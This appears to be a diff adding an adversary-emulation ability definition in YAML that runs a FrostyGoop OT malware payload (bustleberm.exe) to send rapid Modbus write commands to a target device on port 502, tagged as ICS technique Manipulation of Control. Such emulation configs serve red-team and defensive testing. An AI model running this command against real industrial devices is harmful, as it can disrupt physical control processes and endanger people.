@@ -1,0 +1,21 @@
+---
+
+- id: 5b773097-b5b7-439c-9145-210b58993bad
+  name: FrostyGoop Write
+  description: |
+    Uses the FrostyGoop OT Malware payload to send a large number of write
+    commands to a target in a very short period of time. Note the payload
+    expects the target device to be listening for Modbus on port 502.
+  tactic: impact
+  technique:
+    attack_id: T0831
+    name: Manipulation of Control
+  repeatable: true
+  delete_payload: true
+  platforms:
+    windows:
+      psh:
+        command: >
+          .\bustleberm.exe -ip #{frostygoop.target.ip} -mode write -address #{frostygoop.write.address} -count #{frostygoop.write.count} -value #{frostygoop.write.value} -debug
+        payloads:
+          - bustleberm.exe
